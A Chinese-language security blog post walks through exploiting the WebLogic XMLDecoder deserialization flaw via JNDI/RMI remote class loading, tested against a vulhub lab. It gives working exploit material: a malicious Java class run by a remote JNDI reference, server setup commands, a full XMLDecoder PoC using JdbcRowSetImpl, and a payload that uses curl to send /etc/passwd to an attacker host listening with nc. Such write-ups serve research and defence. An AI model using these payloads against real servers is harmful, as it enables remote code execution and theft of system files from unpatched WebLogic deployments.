---
title: Weblogic XMLDecoder RCE之RMI利用
date: 2018-01-09 10:45:49
tags: [vul,sec,weblogic,rmi]
categories: Security
---
<script src="https://ob5vt1k7f.qnssl.com/pangu.js"></script>

前阵子披露出的Weblogic XMLDecoder反序列化漏洞影响广泛，不少厂商都中了招，最近又捕获到不少利用这个漏洞进行挖矿的案例，实际上一开始在野外出现的利用就是挖矿程序，那时候漏洞还没被披露= =所以说有些时候黑产都快成为行业的风向标了，安全领域需要与黑灰色产业斗智斗勇，任重道远...

这个漏洞的PoC写法灵活变种很多，这次来简单说一下利用java的远程方法调用(Remote Method Invocation, RMI)进行利用的方式

### 0x01 RMI简介
这里就直接贴一段网上的介绍

> RMI是Remote Method Invocation的简称，是J2SE的一部分，能够让程序员开发出基于Java的分布式应用。一个RMI对象是一个远程Java对象，可以从另一个Java虚拟机上（甚至跨过网络）调用它的方法，可以像调用本地Java对象的方法一样调用远程对象的方法，使分布在不同的JVM中的对象的外表和行为都像本地对象一样。

> 对于任何一个以对象为参数的RMI接口，你都可以发一个自己构建的对象，迫使服务器端将这个对象按任何一个存在于class path中的可序列化类来反序列化。

> RMI的传输100%基于反序列化。

说实话有点难理解，简单说就是我们可以在远程服务器创建一个对象，然后在本地通过rmi的方式调用这个对象，如果攻击者可以控制某个方法向攻击者的服务器发起rmi请求，从而加载恶意类，就能达到远程攻击的目的。rmi属于JNDI的一种实现方式。

### 0x02 本地调试
这里我使用了@廖新喜的[fastjson 远程反序列化](http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/)攻击使用的PoC，里面的JNDI服务可以满足要求

下载[项目](https://github.com/shengqi158/fastjson-remote-code-execute-poc)，在IDEA中打开，我们使用的是JNDI的服务端和客户端部分

#### 远程
首先我们在远程服务器上建立一个`Exploit`类:
```
public class Exploit {
    public Exploit(){
        try{
            Runtime.getRuntime().exec("calc");
        }catch(Exception e){
            e.printStackTrace();
        }
    }
    public static void main(String[] argv){
        Exploit e = new Exploit();
    }
}
```
然后编译为class:
`/usr/lib/jvm/jdk1.7.0_79/bin/javac Exploit.java`

**注意** 编译`Exploit`的java版本需要和接下来要用的本地java版本一致，否则会导致错误

经过测试jdk1.8版本会有异常产生，需要额外设置`com.sun.jndi.rmi.object.trustURLCodebase = True`，所以这里建议使用jdk1.8以下版本

![error](https://ob5vt1k7f.qnssl.com/b2MmC)

编译完成之后在VPS开启一个http服务

#### 本地
> JNDIServer.java

```
package person.server;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.NamingException;
import javax.naming.Reference;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

/**
 * Created by liaoxinxi on 2017-11-6.
 */

public class JNDIServer {
    public static void start() throws AlreadyBoundException, RemoteException, NamingException {
        Registry registry = LocateRegistry.createRegistry(1099);
        //http://xxlegend.com/Exploit.class即可
        //factoryLocation 一定得是ip后带斜杠，这个斜杠少不得，少了的话到web服务器的请求就变成了GET / 而不是正常的GET /Exploit.class
        Reference reference = new Reference("Exploit",
                "Exploit", "http://remote_server:80/"); //此处修改为自己的远程服务器
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
        registry.bind("Exploit", referenceWrapper);

    }

    public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException {
        start();
    }
}
```

将`factoryLocation`指向远程`Exploit`所在的地址，并且要以`/`结尾，原因注释里已经说了

> TestJNDI.java

```
package person;

import javax.naming.*;
import javax.naming.directory.DirContext;
import javax.naming.directory.InitialDirContext;
import java.util.Hashtable;


/**
 * Created by liaoxinxi on 2017-9-5.
 */
public class TestJNDI {
    public static void testRmi() throws NamingException {
        String url = "rmi://127.0.0.1:1099";
        Hashtable env = new Hashtable();
        env.put(Context.PROVIDER_URL, url);
        env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.rmi.registry.RegistryContextFactory");
        Context context = new InitialContext(env);
//        Object object1 = context.lookup("rmi://remote_server:1099/Exploit");
        Object object = context.lookup("Exploit");//ok
//        System.out.println("Object:" + object);
    }
    public static void main(String[] argv) throws NamingException {
        testRmi();
    }
}
```
首先测试本地JNDI服务，先运行`JNDIServer`，可以看到在本地监听了1099端口

![1099](https://ob5vt1k7f.qnssl.com/OLArZ)

然后运行客户端`TestJNDI`，可以看到VPS收到了一次请求，访问了`Exploit.class`，接着执行了calc:

![calc](https://ob5vt1k7f.qnssl.com/e5ntY)

测试成功

整个流程是这样的：`lookup`方法向JNDI服务请求`Exploit`，JNDI绑定了一个`referenceWrapper`，而`JNDIReferences`加载了外部对象(远程)，外部对象包含攻击载荷，本地反序列化执行

那我们可不可以在远程服务器开启一个JNDI服务和http服务，使应用通过`rmi://remote_server:1099/Exploit`远程调用呢？

### 0x03 远程利用
我们把项目打成jar包上传到VPS上，然后开启一个JNDI服务和http服务

> 开启JNDI服务

```
/usr/lib/jvm/jdk1.6.0_45/bin/java -jar -Djava.rmi.server.hostname="192.168.1.2" jnditest.jar
```
**注意**
如果此处不指定`rmi.server.hostname`的话会出现错误`Root exception is java.rmi.ConnectException: Connection refused to host: 127.0.0.1`

> 开启http服务

```
python -m SimpleHTTPServer 80
```

然后修改JNDI客户端部分，让它访问rmi远程服务
```
Object object = context.lookup("rmi://remote_server/Exploit");
```
可以看到执行成功

![calc2](https://ob5vt1k7f.qnssl.com/fcbQR)


### 0x04 测试Weblogic
下面我们测试一下在实战中能否利用rmi远程代码执行
PoC
```
<java version="1.6.0_45" class="java.beans.XMLDecoder">
    <void class="com.sun.rowset.JdbcRowSetImpl">
        <void property="dataSourceName">
            <string>rmi://remote_server:1099/Exploit</string>
        </void>
        <void property="autoCommit">
            <boolean>true</boolean>
        </void>
    </void>
</java>
```
同样的，修改rmi地址为我们自己的服务器。

由于vulhub搭建的Weblogic环境是基于jdk 1.6.0_45版本的，所以我们还得使用jdk 1.6重新编译项目，服务端同样也是

再由于目标运行在linux上，无法弹计算器，所以我们还得改Exploit类的命令部分，改成可以回显的或者反弹shell的类，这里仅供参考
```
public class Rev {
    public Rev(){
        try{
            Runtime.getRuntime().exec("curl -F value=@/etc/passwd remote_server:3388");
        }catch(Exception e){
            e.printStackTrace();
        }
    }
    public static void main(String[] argv){
        Rev e = new Rev();
    }
}
```
VPS上nc监听3388端口，执行成功的话会接收到目标主机的passwd信息

同样的，先开启JNDI和http服务，还得再监听3388，然后发送PoC

![rev](https://ob5vt1k7f.qnssl.com/fjakh)
成功接收到信息，利用成功。




### 0x05 总结
简单总结一下这个利用方式，有几个需要注意的点

- java版本问题。编译恶意类的java版本，生成jar包的版本，目标运行的java版本需要一致，这在一定程度上限制了通用性

	再一个，java版本不能高于7，因为在jdk1.8中做了限制，需要设置`trustURLCodebase`为`true`

- 需要指定`rmi.server.hostname`，在这里坑了好久，一开始以为是ipv6的问题，因为在vps上绑定jndi服务后监听的是tcp6，在github上也有人提了这个问题；后来发现本地执行客户端后与远程主机是建立连接的，却卡在了这个连接上，没有消息通信，说明tcp通道是可以建立的，应该是别的地方有问题。执行后jndi服务器去找了127.0.0.1，一开始以为是本地地址，测试了一番之后发现原来是vps的127.0.0.1，说明已经执行到远程类的部分了，只不过解析地址的时候出现了错误，后来在[stackoverflow](https://stackoverflow.com/questions/15685686/java-rmi-connectexception-connection-refused-to-host-127-0-1-1)和[这里](http://kbase.zohocorp.com/kbase/Web_NMS/Server_Framework/file_112641.html)找到了答案。


参考：
https://www.one-tab.com/page/rruKb03ATCuYb59FcLA2HQ

<script>pangu.spacingPage();</script>







